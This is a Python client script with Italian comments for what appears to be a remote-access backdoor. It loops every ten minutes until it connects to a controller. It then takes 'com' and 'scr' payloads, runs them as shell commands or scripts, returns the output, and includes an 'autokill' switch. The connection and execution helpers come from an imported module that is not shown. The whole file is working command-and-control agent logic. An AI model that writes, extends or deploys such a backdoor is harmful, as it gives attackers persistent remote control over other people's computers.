#import
import os
import sys
import function
import time
Connection = function.Connection()
Comand = function.Comand()

# loop che tenta la connessione al targhet ogni 10 min
def tryconn():
    while True:
        stat_conn = Connection.INIT_CONN()
        if stat_conn == True:
            break
        time.sleep(600)

# funzione che esegue le operazioni richieste
def service():
    kill = None
    try:
        print("inizio ciclo...")
        while True:
            try:
                payload = Connection.RECV()
            except:
                print("errore nella recezione del pacchetto...")

            if payload != False:
                payload = payload.decode()
                payload = list(payload)
                index = []
                index.append(payload[0])
                index.append(payload[1])
                index.append(payload[2])
                index = "".join(index)
                payload.pop(0)
                payload.pop(0)
                payload.pop(0)
                payload = "".join(payload)

                # esegue un comando
                if index == "com":
                    if payload == "exit":
                        break

                    elif payload.split(" ")[0] == "cd" and len(payload.split()) == 2:
                        if payload.split(" ")[1] == "..":
                            try:
                                currentdir = os.getcwd().split("\\")
                                currentdir.pop(-1)
                                backdir = "\\".join(currentdir)
                                os.chdir(backdir)
                                Connection.SEND("")
                            except:
                                Connection.SEND("errore nell'esecuzione del comando...")
                        else:
                            try:
                                os.chdir(payload.split(" ")[1])
                                Connection.SEND("")
                            except:
                                Connection.SEND("cartella inraggiungibile")

                    elif payload == "autokill":
                        kill = True
                        break

                    else:
                        output = Comand.EX_COMMAND(payload)
                        print(output)
                        Connection.SEND(output)
                #esegue uno script
                elif index == "scr":
                    output = Comand.EX_SCRIPT(payload)
                    Connection.SEND(output)
                else:
                    print("errore nel crc32")
                    pass
            else:
                print("errore nel crc32")
                conn = Connection.SEND("crc32 err")
                if conn == False:
                    break
    except:
        print("errore connessione...")
        pass

    return kill

while True:
    time.sleep(10)
    tryconn()
    print("connessione stabilita...")
    kill = service()
    if kill == True:
        quit()